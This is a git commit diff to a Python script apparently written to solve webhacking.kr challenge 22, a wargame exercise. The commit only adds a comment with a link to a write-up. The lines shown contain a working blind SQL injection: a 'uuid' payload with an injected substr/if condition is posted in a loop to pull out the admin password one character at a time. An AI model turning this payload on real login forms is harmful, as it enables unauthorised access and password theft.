d12bad701621359dd046b984e4157e4f5be1dbcd
hungry-shark <43433753+hungry-shark@users.noreply.github.com>
2019-08-19 22:38:03 +0900

    Update bruteforce ver POST.py

--- bruteforce ver POST.py
+++ bruteforce ver POST.py
@@ -9,7 +9,7 @@ result=''
 length=32
 
 for i in range (1,length+1) :
-    for j in chr_list :
+    for j in chr_list : #webhacking 22번 https://famous7.github.io/webhacking/webhacking.kr-22/.
         params = {"uuid":"admin' and if(substr(pw,"+str(i)+",1)in("+hex(ord(j))+"),1,0)#","pw":""}
         req = requests.post(url,data=params,cookies=cookies)
         print("i: "+ str(i)+" char:"+j)
